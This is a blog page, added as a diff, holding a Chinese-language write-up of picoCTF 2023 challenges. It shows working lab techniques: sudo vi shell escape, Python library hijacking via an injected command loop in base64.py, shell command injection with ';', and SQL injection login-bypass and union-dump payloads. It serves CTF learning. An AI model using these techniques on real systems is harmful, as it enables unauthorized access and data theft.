@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html>
+<head><!-- hexo injector head_begin start --><!-- Microsoft Clarity begins-->
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "nq90i0uzl9");
+    </script>
+    <!-- Microsoft Clarity ends-->
+    <!-- Google tag (gtag.js) begins-->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16453505124"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'AW-16453505124');
+    </script>
+    <!-- Google tag (gtag.js) ends-->
+    <!-- hexo injector head_begin end -->
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+  <title>
+    
+    picoCTF 2023 writeup 丨
+    
+
+    typo
+  </title>
+
+  
+  <link rel="shortcut icon" href="/icon.svg">
+  
+
+  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+  
+  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
+  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
+  
+
+  <!-- 字体 -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+
+  
+<link rel="stylesheet" href="/css/root.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/post.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <header class="header">
+  <section class="header-container">
+    <a class="logo" href="/">TriangeSnake&#39;s Blog</a>
+    <ul class="nav">
+      
+      <li><a href="/archives">archives</a></li>
+      
+      <li><a href="/about">about</a></li>
+      
+    </ul>
+  </section>
+</header>
+  <main class="main">
+    <article class="post">
+  
+  <div class="post-title">picoCTF 2023 writeup</div>
+  <div class="post-meta">
+    <div class="date">2023 五月 29日</div>
+    <div class="tags">
+      
+      <div class="tag-item">writeup</div>
+      
+      <div class="tag-item">CTF</div>
+      
+    </div>
+  </div>
+  
+
+  <main class="post-content"><h2 id="Binary-Exploitation"><a href="#Binary-Exploitation" class="headerlink" title="Binary Exploitation"></a>Binary Exploitation</h2><h3 id="hijacking"><a href="#hijacking" class="headerlink" title="hijacking"></a>hijacking</h3><pre><code>AUTHOR: THEONESTE BYAGUTANGAZA
+
+Description
+Getting root access can allow you to read the flag. Luckily there is a 
+python file that you might like to play with.
+Through Social engineering, we&#39;ve got the credentials to use on the 
+server. SSH is running on the server.
+</code></pre>
+<h4 id="隨便逛逛"><a href="#隨便逛逛" class="headerlink" title="隨便逛逛"></a>隨便逛逛</h4><p><img src="https://hackmd.io/_uploads/BkCIB9eLh.png"><br>發現&#x2F;challenge資料夾很可疑，但是沒辦法cd進去</p>
+<p><img src="https://hackmd.io/_uploads/BJpdBcgIn.png"></p>
+<p>查看sudo 發現使用者可以用sudo權限使用vi<br><img src="https://hackmd.io/_uploads/Hy6NrclIn.png"></p>
+<h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><pre><code class="highlight shell">sudo vi
+
+:shell</code></pre>
+<p><img src="https://hackmd.io/_uploads/rkEI89xI3.png"><br>privilege escalation了，再來就直接A進去&#x2F;challenge&#x2F;把flag撈出來就好</p>
+<p><img src="https://hackmd.io/_uploads/rkETIce8h.png"></p>
+<blockquote>
+<p>picoCTF{pYth0nn_libraryH!j@CK!n9_5a7b5866}</p>
+</blockquote>
+<h4 id="原本解法"><a href="#原本解法" class="headerlink" title="原本解法"></a>原本解法</h4><pre><code>這題當初在解的時候是在.server.py裡面import 的base64裡面搞鬼
+只是不知道為甚麼在寫writeup的時候沒辦法用root權限執行.server.py
+</code></pre>
+<p>先<code>ls -al</code>發現有一個<code>.server.py</code></p>
+<p><code>cat .server.py</code></p>
+<pre><code class="highlight python"><span class="keyword">import</span> base64
+<span class="keyword">import</span> os
+<span class="keyword">import</span> socket
+ip = <span class="string">&#x27;picoctf.org&#x27;</span>
+response = os.system(<span class="string">&quot;ping -c 1 &quot;</span> + ip)
+<span class="comment">#saving ping details to a variable</span>
+host_info = socket.gethostbyaddr(ip)
+<span class="comment">#getting IP from a domaine</span>
+host_info_to_str = <span class="built_in">str</span>(host_info[<span class="number">2</span>])
+host_info = base64.b64encode(host_info_to_str.encode(<span class="string">&#x27;ascii&#x27;</span>))
+<span class="built_in">print</span>(<span class="string">&quot;Hello, this is a part of information gathering&quot;</span>,<span class="string">&#x27;Host: &#x27;</span>, host_info)</code></pre>
+
+<p><code>vim .server.py</code>沒辦法動<code>.server.py</code>，因為他是readonly，但是權限沒有設定到<code>base64.py</code></p>
+<p><strong>在import file裡面加料</strong><br><code>vim /usr/lib/python3.8/base64.py</code></p>
+<pre><code class="highlight python"><span class="keyword">import</span> os
+<span class="keyword">while</span> <span class="number">1</span>:
+    cmd=<span class="built_in">input</span>()
+    <span class="built_in">print</span>(os.popen(cmd).read())</code></pre>
+
+<p><strong>get shell</strong></p>
+<pre><code class="highlight shell">sudo python3 .server.py</code></pre>
+
+<h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="hideme"><a href="#hideme" class="headerlink" title="hideme"></a>hideme</h3><pre><code>AUTHOR: GEOFFREY NJOGU
+
+Description
+Every file gets a flag.
+The SOC analyst saw one image been sent back and forth between two
+people. They decided to investigate and found out that there was more
+than what meets the eye here.
+</code></pre>
+<p>下載下來發現是一張圖片<br>看一看感覺很正常</p>
+<p>用<code>exiftool</code>看了一下沒有把flag藏在某個欄位裡</p>
+<p><code>strings flag.png</code>看看<br><img src="https://hackmd.io/_uploads/BkC8pqxIn.png"><br>發現裡面有長得很像路徑的東東</p>
+<p>直接把<code>flag.png</code>當成zip解壓縮看看</p>
+<pre><code class="highlight shell">unzip flag.png</code></pre>
+<p>得到半張flag<br><img src="https://hackmd.io/_uploads/r1xCia5lI2.png"></p>
+<blockquote>
+<p>picoCTF{Hiddinng_An_imag3_within_@n_ima9e_92076717}</p>
+</blockquote>
+<h3 id="FindAndOpen"><a href="#FindAndOpen" class="headerlink" title="FindAndOpen"></a>FindAndOpen</h3><pre><code>AUTHOR: MUBARAK MIKAIL
+
+Description
+Someone might have hidden the password in the trace file.
+Find the key to unlock this file. This tracefile might be good to analyze.
+</code></pre>
+<p>這題給了兩個檔案，第一個是<code>flag.zip</code>和<code>dump.pcap</code>。<br>嘗試解壓縮<code>flag.zip</code>，發現需要密碼</p>
+<h4 id="先從dump-pcap下手看看"><a href="#先從dump-pcap下手看看" class="headerlink" title="先從dump.pcap下手看看"></a>先從<code>dump.pcap</code>下手看看</h4><p>用wireshark打開<code>dump.pcap</code></p>
+<p><img src="https://hackmd.io/_uploads/r11qn2eL2.png"><br>隨便看幾個封包後發現都有明文</p>
+<p><img src="https://hackmd.io/_uploads/SyH7T2lUh.png"><br>找到一個超可疑的封包，<code>=</code>結尾很可能是base64編碼的填充字元</p>
+<p>decode後得到半截flag</p>
+<blockquote>
+<p>This is the secret: picoCTF{R34DING_LOKd_</p>
+</blockquote>
+<p>回到<code>flag.zip</code>，直接通靈把第一段flag當密碼</p>
+<blockquote>
+<p>picoCTF{R34DING_LOKd_fil56_succ3ss_5ed3a878}</p>
+</blockquote>
+<p>??</p>
+<h2 id="General-Skills"><a href="#General-Skills" class="headerlink" title="General Skills"></a>General Skills</h2><h3 id="money-ware"><a href="#money-ware" class="headerlink" title="money-ware"></a>money-ware</h3><pre><code>AUTHOR: JUNI19
+
+Description
+Flag format: picoCTF&#123;Malwarename&#125;
+The first letter of the malware name should be capitalized and the rest 
+lowercase.
+Your friend just got hacked and has been asked to pay some bitcoins to 
+1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX. He doesn’t seem to understand what is 
+going on and asks you for advice. Can you identify what malware he’s 
+being a victim of?
+</code></pre>
+<p>Google <code>1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX</code></p>
+<p>找到<a target="_blank" rel="noopener" href="https://www.cnbc.com/2017/06/28/ransomware-cyberattack-petya-bitcoin-payment.html">CNBC的新聞</a><br><img src="https://hackmd.io/_uploads/SkJ-yplUn.png"></p>
+<blockquote>
+<p>picoCTF{Petya}</p>
+</blockquote>
+<p>水爛</p>
+<h3 id="repetitions"><a href="#repetitions" class="headerlink" title="repetitions"></a>repetitions</h3><pre><code>AUTHOR: THEONESTE BYAGUTANGAZA
+
+Description
+Can you make sense of this file?
+Download the file here.
+</code></pre>
+<p>下載<code>enc_flag</code></p>
+<pre><code class="highlight plaintext">VmpGU1EyRXlUWGxTYmxKVVYwZFNWbGxyV21GV1JteDBUbFpPYWxKdFVsaFpWVlUxWVZaS1ZWWnVh
+RmRXZWtab1dWWmtSMk5yTlZWWApiVVpUVm10d1VWZFdVa2RpYlZaWFZtNVdVZ3BpU0VKeldWUkNk
+MlZXVlhoWGJYQk9VbFJXU0ZkcVRuTldaM0JZVWpGS2VWWkdaSGRXCk1sWnpWV3hhVm1KRk5XOVVW
+VkpEVGxaYVdFMVhSbFZhTTBKWVZGWmFXbVZzV2tkWk0yaFRDbUpXV25sVVZtaFRWMGRHZEdWRlZs
+aGkKYlRrelZERldUMkpzUWxWTlJYTkxDZz09Cg==</code></pre>
+<p>&#x3D;&#x3D;經典base64</p>
+<p>decode後</p>
+<pre><code class="highlight plaintext">VjFSQ2EyTXlSblJUV0dSVllrWmFWRmx0TlZOalJtUlhZVVU1YVZKVVZuaFdWekZoWVZkR2NrNVVX
+bUZTVmtwUVdWUkdibVZXVm5WUgpiSEJzWVRCd2VWVXhXbXBOUlRWSFdqTnNWZ3BYUjFKeVZGZHdW
+MlZzVWxaVmJFNW9UVVJDTlZaWE1XRlVaM0JYVFZaWmVsWkdZM2hTCmJWWnlUVmhTV0dGdGVFVlhi
+bTkzVDFWT2JsQlVNRXNLCg==</code></pre>
+
+<p>再decode</p>
+<pre><code class="highlight plaintext">V1RCa2MyRnRTWGRVYkZaVFltNVNjRmRXYUU5aVJUVnhWVzFhYVdGck5UWmFSVkpQWVRGbmVWVnVR
+bHBsYTBweVUxWmpNRTVHWjNsVgpXR1JyVFdwV2VsUlZVbE5oTURCNVZXMWFUZ3BXTVZZelZGY3hS
+bVZyTVhSWGFteEVXbm93T1VOblBUMEsK</code></pre>
+
+<p>de</p>
+<pre><code class="highlight plaintext">WTBkc2FtSXdUbFZTYm5ScFdWaE9iRTVxVW1aaWFrNTZaRVJPYTFneVVuQlpla0pyU1ZjME5GZ3lV
+WGRrTWpWelRVUlNhMDB5VW1aTgpWMVYzVFcxRmVrMXRXamxEWnowOUNnPT0K</code></pre>
+<p>deeee</p>
+<pre><code class="highlight plaintext">Y0dsamIwTlVSbnRpWVhObE5qUmZiak56ZEROa1gyUnBZekJrSVc0NFgyUXdkMjVzTURSa00yUmZN
+V1V3TW1Fek1tWjlDZz09Cg==</code></pre>
+
+<p>eeeeeeee</p>
+<pre><code class="highlight plaintext">cGljb0NURntiYXNlNjRfbjNzdDNkX2RpYzBkIW44X2Qwd25sMDRkM2RfMWUwMmEzMmZ9Cg==</code></pre>
+<p>aaaaaaaaaa</p>
+<pre><code class="highlight plaintext">picoCTF&#123;base64_n3st3d_dic0d!n8_d0wnl04d3d_1e02a32f&#125;</code></pre>
+<p><img src="https://media.tenor.com/eipo4TRTSKwAAAAd/moe-simpsons-barney-e-moe.gif"></p>
+<blockquote>
+<p>picoCTF{base64_n3st3d_dic0d!n8_d0wnl04d3d_1e02a32f}</p>
+</blockquote>
+<h3 id="Permissions"><a href="#Permissions" class="headerlink" title="Permissions"></a>Permissions</h3><pre><code>AUTHOR: GEOFFREY NJOGU
+
+Description
+Can you read files in the root file?
+The system admin has provisioned an account for you on the main server:
+ssh -p 53849 picoplayer@saturn.picoctf.net
+Password: x+T6aPgE4-
+Can you login and read the root file?    
+</code></pre>
+<p><img src="https://hackmd.io/_uploads/B1xxDTeI2.png"></p>
+<blockquote>
+<p>picoCTF{uS1ng_v1m_3dit0r_f6ad392b}</p>
+</blockquote>
+<p>水爛</p>
+<h3 id="chrono"><a href="#chrono" class="headerlink" title="chrono"></a>chrono</h3><pre><code>AUTHOR: MUBARAK MIKAIL
+
+Description
+How to automate tasks to run at intervals on linux servers?
+Use ssh to connect to this server:
+Server: saturn.picoctf.net
+Port: 50602
+Username: picoplayer 
+Password: tPmsUpiHeZ
+</code></pre>
+<p><img src="https://hackmd.io/_uploads/ByLMuagIn.png"></p>
+<blockquote>
+<p>picoCTF{Sch3DUL7NG_T45K3_L1NUX_0bb95b71}</p>
+</blockquote>
+<p>?</p>
+<h3 id="useless"><a href="#useless" class="headerlink" title="useless"></a>useless</h3><pre><code>AUTHOR: LOIC SHEMA
+
+Description
+There&#39;s an interesting script in the user&#39;s home directory
+Additional details will be available after launching your challenge instance.
+</code></pre>
+<p><img src="https://hackmd.io/_uploads/HkhIYaeIn.png"></p>
+<blockquote>
+<p>picoCTF{us3l3ss_ch4ll3ng3_3xpl0it3d_6173}</p>
+</blockquote>
+<h3 id="Special"><a href="#Special" class="headerlink" title="Special"></a>Special</h3><pre><code>AUTHOR: LT &#39;SYREAL&#39; JONES
+
+Description
+Don&#39;t power users get tired of making spelling mistakes in the shell? Not
+anymore! Enter Special, the Spell Checked Interface for Affecting Linux.
+Now, every word is properly spelled and capitalized... automatically and 
+behind-the-scenes! Be the first to test Special in beta, and feel free to
+tell us all about how Special streamlines every development process that
+you face. When your co-workers see your amazing shell interface, just
+tell them: That&#39;s Special (TM)
+Start your instance to see connection details.
+Additional details will be available after launching your challenge
+instance.
+</code></pre>
+<p>這題會一直把輸入的指令變成很簡單的單字，然後把開頭用成大寫<br><code>ls</code>會變<code>Is</code><br><code>cat</code>會變<code>Cat</code>，但如果不是第一個字母就不會變大寫，所以可以用cat指令<br>用<code>;</code> 搭配Regex Command Injection</p>
+<pre><code class="highlight shell">cat;cat *</code></pre>
+<p><img src="https://hackmd.io/_uploads/SJMKTpxLh.png"><br>發現目錄下面有一個資料夾<code>blargh</code></p>
+<pre><code class="highlight shell">cat;cat blargh/*</code></pre>
+<p><img src="https://hackmd.io/_uploads/SyasaagIn.png"></p>
+<blockquote>
+<p>picoCTF{5p311ch3ck_15_7h3_w0r57_f578af59}</p>
+</blockquote>
+<h2 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h2><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><pre><code>AUTHOR: MUBARAK MIKAIL
+
+Description
+Try reversing this file? Can ya?
+I forgot the password to this file. Please find it for me?
+</code></pre>
+<p>題目給了一個檔案<code>ret</code>，執行後要輸密碼<br><img src="https://hackmd.io/_uploads/H1IQkCgU2.png"></p>
+<p>丟GDB</p>
+<pre><code class="highlight shell">start 
+c
+ctrl^C
+ni到死</code></pre>
+<p><img src="https://hackmd.io/_uploads/SJHUe0eL3.png"><br>在呼叫strcmp比對密碼時把<code>rsi</code> dump出來，得到前半截flag</p>
+<blockquote>
+<p>picoCTF{3lf_r3v3r5ing_succe55ful_9ae8528</p>
+</blockquote>
+<p>重新執行<code>ret</code>，輸入密碼<br><img src="https://hackmd.io/_uploads/HJwZb0l83.png"></p>
+<blockquote>
+<p>picoCTF{3lf_r3v3r5ing_succe55ful_9ae85289}</p>
+</blockquote>
+<h2 id="Web-Exploitation"><a href="#Web-Exploitation" class="headerlink" title="Web Exploitation"></a>Web Exploitation</h2><h3 id="More-SQLi"><a href="#More-SQLi" class="headerlink" title="More SQLi"></a>More SQLi</h3><pre><code>AUTHOR: MUBARAK MIKAIL
+
+Description
+Can you find the flag on this website.
+Additional details will be available after launching your challenge instance.
+</code></pre>
+<h4 id="Bypass-login"><a href="#Bypass-login" class="headerlink" title="Bypass login"></a>Bypass login</h4><p>進入網頁，經典登入介面<br><img src="https://hackmd.io/_uploads/SkQs-CeL3.png"></p>
+<pre><code class="highlight sql">username<span class="operator">=</span>admin<span class="operator">&amp;</span>
+password<span class="operator">=</span><span class="string">&#x27; or &#x27;</span>a<span class="string">&#x27;=&#x27;</span>a</code></pre>
+
+<p><img src="https://hackmd.io/_uploads/HJnefAeU2.png"><br>題目很貼心把<code>query</code>都print出來給你</p>
+<p>調整一下</p>
+<pre><code class="highlight sql">username<span class="operator">=</span><span class="number">123</span><span class="operator">&amp;</span>
+password<span class="operator">=</span><span class="string">&#x27; or 1=1;--</span></code></pre>
+
+<p>進入之後有一個搜尋頁面<br><img src="https://hackmd.io/_uploads/SkTYRu-Uh.png"></p>
+<h4 id="測試有幾個欄位"><a href="#測試有幾個欄位" class="headerlink" title="測試有幾個欄位"></a>測試有幾個欄位</h4><pre><code class="highlight sql">searchInput<span class="operator">=</span><span class="string">&#x27; union select 1,2,3;--</span></code></pre>
+<p><img src="https://hackmd.io/_uploads/ByxzS0uW83.png"></p>
+<h4 id="dump-Table"><a href="#dump-Table" class="headerlink" title="dump Table"></a>dump Table</h4><pre><code class="highlight sql">searchInput<span class="operator">=</span><span class="string">&#x27; or &#x27;</span>a<span class="string">&#x27;=&#x27;</span>a</code></pre>
+<p><img src="https://hackmd.io/_uploads/BJwUJt-Ln.png"><br>沒看到<code>flag</code>，可能在別的<code>table</code></p>
+<pre><code class="highlight sql"><span class="string">&#x27; union select group_concat(sql),2,3 from sqlite_master WHERE type=&#x27;</span><span class="keyword">table</span><span class="string">&#x27;;--</span></code></pre>
+<p><img src="https://hackmd.io/_uploads/SkJ-xt-83.png"></p>
+<p>現在知道<code>flag</code>應該在<code>more_table</code>的<code>flag_TEXT</code>欄位</p>
+<pre><code class="highlight sql"><span class="string">&#x27; union select flag,2,3 from more_table;--</span></code></pre>
+<p><img src="https://hackmd.io/_uploads/B16UGtZ82.png"></p>
+<blockquote>
+<p>picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}</p>
+</blockquote>
+<h3 id="MatchTheRegex"><a href="#MatchTheRegex" class="headerlink" title="MatchTheRegex"></a>MatchTheRegex</h3><pre><code>AUTHOR: SUNDAY JACOB NWANYIM
+
+Description
+How about trying to match a regular expression
+Additional details will be available after launching your challenge instance.
+</code></pre>
+<p>一開始沒看hint不知道到底要幹嘛<br><img src="https://hackmd.io/_uploads/rk36rFZ8h.png"></p>
+<p>結果是要match<code>^p.....F!?</code><br><img src="https://hackmd.io/_uploads/SyhyLF-Uh.png"></p>
+<p><img src="https://hackmd.io/_uploads/S1jOSFbLn.png"></p>
+<blockquote>
+<p>picoCTF{succ3ssfully_matchtheregex_9080e406}</p>
+</blockquote>
+<p>世紀水題</p>
+<h3 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h3><pre><code>AUTHOR: GEOFFREY NJOGU
+
+Description
+Help us test the form by submiting the username as test and password as test!
+Additional details will be available after launching your challenge instance.
+</code></pre>
+<p>先用<code>test</code> <code>test!</code>登入<br><img src="https://hackmd.io/_uploads/S1Q0_t-U2.png"></p>
+<p>進去後他說<em>I was redirected here by a friend of mine but i couldnt find anything. Help me search for flags :-)</em><br><img src="https://hackmd.io/_uploads/SyiWKKbU3.png"></p>
+<h4 id="用BurpSuite查看被redirected的頁面"><a href="#用BurpSuite查看被redirected的頁面" class="headerlink" title="用BurpSuite查看被redirected的頁面"></a>用<code>BurpSuite</code>查看被redirected的頁面</h4><p><img src="https://hackmd.io/_uploads/SkjKtK-L2.png"><br>id看起來很像經典base64</p>
+<p><img src="https://hackmd.io/_uploads/ryteqKbUh.png"><br><img src="https://hackmd.io/_uploads/HJZycFWLh.png"></p>
+<blockquote>
+<p>picoCTF{proxies_all_the_way_be716d8e}</p>
+</blockquote>
+</main>
+
+</article>
+
+
+<script src="/js/highlight.js"></script>
+
+  </main>
+  <footer class="footer">
+  
+  <span>Copyright © TriangleSnake</span>
+  
+</footer>
+  
+<script src="/js/theme.js"></script>
+
+</body>
+
+</html>
